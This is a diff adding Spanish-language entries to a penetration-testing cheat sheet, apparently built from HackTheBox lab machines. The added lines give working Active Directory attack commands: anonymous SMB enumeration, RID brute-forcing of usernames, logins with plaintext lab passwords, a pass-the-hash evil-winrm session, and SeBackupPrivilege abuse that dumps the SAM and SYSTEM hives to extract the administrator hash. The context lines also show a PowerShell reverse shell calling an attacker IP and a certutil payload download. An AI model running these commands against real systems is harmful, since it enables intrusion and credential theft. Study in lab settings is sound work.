@@ -211,9 +211,10 @@ nmap -p 445 -A 10.10.1.19
 sudo nmap -p 445 --script smb-protocols 10.129.232.227 -oN nmap_smb_protocols.txt
 sudo nmap -p 139 --script smb-protocols 10.129.232.227 -oN nmap_smb_protocols.txt
 
-#Buscando Credenciales nulas
+#Listar los directorios que tienen credenciales nulas
 smbclient -L 10.129.232.227 -N
-
+#Podemos navegar dentro de la carpeta encontrada con el dominio del DC
+smbclient -N //cicada.htb/HR
 #Para ver los permisos de las carpetas compartidas
 smbmap -H 10.129.232.227
 #Para entrar a una carpeta
@@ -222,6 +223,10 @@ smbmap -H 10.129.232.227 -r [Carpeta]
 smbmap -H 10.129.232.227 --download [Carpeta/Archivo]
 
 smbmap -H 10.129.232.227 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
+
+#listar informacion de una lista de usuarios
+perl ~/Downloads/enum4linux-0.9.1/enum4linux.pl -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -k $(cat users.txt | tr '\n' ',' | sed 's/,$//') 10.10.11.35
+
 ```
 
 Enumeracion de FTP TFTP
@@ -232,6 +237,11 @@ nmap -p 21 www.certifiedhacker.com
 ```
 Para TFTP(Puerto 69) existen herramientas como PortQry y Nmap
 
+Un paso importante para las pruebas, es intentar descargar archivos recursivamente, estan los comandos:
+```s
+wget -m ftp://anonymous:anonymous@10.129.232.230
+wget -m --no-passive ftp://anonymous:anonymous@10.129.232.230
+```
 
 ### [](#header-3)<a id="user_enum">Username Enumeration</a>
 
@@ -274,6 +284,11 @@ Fuerza bruta de contrasenas SMB y SHH
 #en mi maquina parrot tengo esta utilidad como cme
 #Con lista de usuarios y contrasenas
 crackmapexec smb 10.10.10.184 -u users -p credentials --continue-on-success
+#Podemos usar esta herramienta para enumerar usuarios de la forma 
+crackmapexec smb cicada.htb -u "guest" -p '' --rid-brute | grep SidTypeUser
+#Si la respuesta anterior da positivo, podemos usar este comando para guardar los usuarios
+cme smb cicada.htb -u "guest" -p '' --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 >> users.txt
+
 crackmapexec ssh 10.10.11.166 -u users -p password --continue-on-success
 
 #validacion
@@ -281,6 +296,11 @@ crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
 
 #Listar los recursos compartidos con el nuevo usuario
 cme smb 10.129.232.227 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
+```
+
+Teniendo una sesion valida, ahora podemos interactuar con la consola con evilwinrm
+```s
+evil-winrm -i 10.10.10.203 -u "nathen" -p "wendel98"
 ```
 
 ## [](#header-2)<a id="Breaching_ad">Breaching Active Directory</a>
@@ -533,6 +553,7 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$stream = $
 ## [](#header-2)<a id="Privilege_escalation">Privilege escalation</a>
 Manualmente, tenemos el comando whoami, pero en esta ocacion con los privilegios posibles:
 ```s
+whoami /all
 whoami /priv
 ```
 En este ejemplo 1 tenemos como respuesta el privilegio de SeImpersonatePrivilege, el cual se explota de la forma:
@@ -553,6 +574,29 @@ certutil.exe -f -urlcache -split http://10.10.14.29:8080/[Archivos]
 #Nos ponemos en escucha desde la maquina atacante
 nc -nlvp 4646
 ```
+
+Ejemplo 2, explotacion del privilegio SeBackupPrivilege
+```s
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+
+download sam
+download system
+#Usaremos pypykatz para obtener el valor del hash del admin
+
+pypykatz registry --sam sam system
+#Con esto ya podemos iniciar una sesion de evil-winrm
+evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
+```
+
+Parte de la enumeracion, tenemos el comando
+```s
+cmdkey /list
+```
+Aqui en la enumeracion podemos ver que las credenciales de Administrador estan guardadas para ejecutar runas por ejemplo, maquina Access para mas info. Donde se clonara el proyecto Nishang/Shells/Invoke-PowershellTcp.ps1.
+
+
 
 Podemos usar una tool que nos sugiere como explotar un cve para la escalada d elos privilegios
 https://github.com/AonCyberLabs/Windows-Exploit-Suggester
